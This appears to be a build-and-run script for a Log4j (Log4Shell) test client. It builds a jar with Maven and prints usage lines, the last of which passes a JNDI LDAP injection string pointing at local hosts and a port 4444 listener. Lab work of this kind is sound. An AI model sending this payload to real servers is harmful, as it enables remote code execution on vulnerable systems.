mvn clean package assembly:single -Dmaven.test.skip=true 
echo "****************************"
echo "To execute the webserver : "
echo "java -jar target/l4sclients-0.1-all.jar [Port_number]"
echo ""
echo "To execute the cmd line : "
echo "java -cp target/l4sclients-0.1-all.jar Log4jCmdLine '\${jndi:ldap://127.0.0.1:1389/#MM:127.0.0.1:4444}'"
